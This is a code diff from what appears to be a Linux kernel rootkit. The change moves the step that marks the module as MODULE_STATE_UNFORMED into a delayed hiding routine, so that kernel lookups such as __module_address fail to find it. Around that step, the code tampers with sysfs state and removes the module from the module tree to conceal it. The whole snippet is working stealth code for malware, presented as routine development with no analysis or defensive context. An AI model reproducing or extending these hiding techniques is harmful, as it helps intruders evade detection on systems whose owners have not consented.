@@ -187,7 +187,9 @@ static inline void kv_list_del(struct list_head *prev, struct list_head *next)
 static void hide_work_fn(struct work_struct *work)
 {
 	// Set here because it is set to
-	// MODULE_STATE_LIVE in do_init_module
+	// MODULE_STATE_LIVE in do_init_module.
+	// __module_address will return NULL for us
+	// as long as we are "loading"...
 	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
 
 	// Remove module from mod_tree if
@@ -253,10 +255,6 @@ static int _hide_mod(void)
 	// Again, mess with the known marker set by
 	// kobject_del()
 	lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
-
-	// __module_address will return NULL for us
-	// as long as we are "loading"...
-	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
 
 	// Some hiding steps need to be done after do_init_module
 	schedule_delayed_work(&hide_work, msecs_to_jiffies(2000));
